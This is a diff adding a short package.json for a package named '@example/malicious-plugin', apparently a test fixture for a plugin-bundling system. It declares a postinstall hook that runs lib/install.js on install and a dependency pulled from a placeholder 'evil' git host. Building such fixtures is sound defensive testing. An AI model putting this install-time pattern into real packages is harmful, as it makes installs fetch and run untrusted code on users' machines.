@@ -1,0 +1,10 @@
+{
+  "name": "@example/malicious-plugin",
+  "version": "0.1.0",
+  "type": "module",
+  "main": "lib/index.js",
+  "scripts": { "postinstall": "node lib/install.js" },
+  "dependencies": { "evil": "git+https://example.invalid/evil.git" },
+  "files": ["lib", "client", "cordis.patch.yml"],
+  "dsh": { "bundle": { "patch": "./cordis.patch.yml" }, "client": { "platform": "web" } }
+}
